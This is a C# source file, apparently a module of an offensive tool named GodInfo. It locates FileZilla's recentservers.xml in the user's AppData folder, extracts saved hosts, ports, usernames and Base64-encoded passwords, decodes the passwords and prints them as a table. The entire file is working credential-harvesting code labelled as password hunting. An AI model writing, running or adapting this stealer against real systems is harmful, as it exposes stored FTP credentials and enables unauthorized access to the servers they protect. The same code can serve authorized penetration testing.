using GodInfo.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using System.Text;

namespace GodInfo.Commands
{
    public class FileZillaCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string Host;
            public int Port;
            public string UserName;
            public string Password;
        }

        private const string FileZillaConfigFile = "recentservers.xml";

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by FileZilla.");
            if (args.Count == 1)
            {
                string configPath = args[0].ToString();
                GetFileZillaCred(configPath);
            }
            else
            {
                GetFileZillaCred();
            }
        }

        public static void GetFileZillaCred(string configPath = null)
        {
            Logger.TaskHeader("Hunting FileZilla", 1);
            
            if (string.IsNullOrEmpty(configPath))
            {
                configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla", FileZillaConfigFile);
            }

            if (!File.Exists(configPath))
            {
                Logger.WriteLine($"[-] FileZilla config file not found at: {configPath}");
                return;
            }

            Logger.WriteLine($"[+] FileZilla config file found: {configPath}\n");
            ProcessConfigFile(configPath);
        }

        public static bool CheckFileZillaConfigExists()
        {
            string configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla", FileZillaConfigFile);
            return File.Exists(configPath);
        }

        private static void ProcessConfigFile(string configPath)
        {
            List<ConnectionInfo> connections = new List<ConnectionInfo>();

            try
            {
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(configPath);

                XmlNodeList serverNodes = null;
                // 检查两种可能的XML格式
                XmlNodeList recentServersNodes = xmlDocument.GetElementsByTagName("RecentServers");
                if (recentServersNodes.Count > 0)
                {
                    // 新版格式，服务器在RecentServers节点下
                    serverNodes = ((XmlElement)recentServersNodes[0]).GetElementsByTagName("Server");
                }
                else
                {
                    // 直接查找Server节点
                    serverNodes = xmlDocument.GetElementsByTagName("Server");
                }

                if (serverNodes == null || serverNodes.Count == 0)
                {
                    Logger.WriteLine("[-] No server entries found in the config file.");
                    return;
                }

                foreach (XmlNode serverNode in serverNodes)
                {
                    string host = GetXmlNodeValue(serverNode, "Host");
                    string portStr = GetXmlNodeValue(serverNode, "Port");
                    string userName = GetXmlNodeValue(serverNode, "User");
                    string encryptedPassword = GetXmlNodeValue(serverNode, "Pass");

                    // 跳过空记录
                    if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(userName))
                    {
                        continue;
                    }

                    int port = 0;
                    if (!string.IsNullOrEmpty(portStr))
                    {
                        int.TryParse(portStr, out port);
                    }

                    string password = DecodePassword(encryptedPassword);

                    connections.Add(new ConnectionInfo
                    {
                        Host = host,
                        Port = port,
                        UserName = userName,
                        Password = password
                    });
                }

                if (connections.Count > 0)
                {
                    Logger.PrintTableFromStructs(connections);
                }
                else
                {
                    Logger.WriteLine("[-] No valid server credentials found in the config file.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error processing FileZilla config file: {ex.Message}");
            }
        }

        private static string GetXmlNodeValue(XmlNode parentNode, string nodeName)
        {
            try
            {
                // 尝试直接选择子节点
                XmlNode node = parentNode.SelectSingleNode(nodeName);
                if (node != null)
                {
                    return node.InnerText;
                }
                
                // 尝试通过GetElementsByTagName查找子节点
                if (parentNode is XmlElement element)
                {
                    XmlNodeList nodeList = element.GetElementsByTagName(nodeName);
                    if (nodeList != null && nodeList.Count > 0)
                    {
                        return nodeList[0].InnerText;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error getting node value for {nodeName}: {ex.Message}");
            }
            
            return string.Empty;
        }

        private static string DecodePassword(string encodedPassword)
        {
            if (string.IsNullOrEmpty(encodedPassword))
            {
                return string.Empty;
            }

            try
            {
                // FileZilla stores passwords as Base64-encoded strings
                byte[] bytes = Convert.FromBase64String(encodedPassword);
                return Encoding.UTF8.GetString(bytes);
            }
            catch
            {
                return "[解密失败]";
            }
        }
    }
} 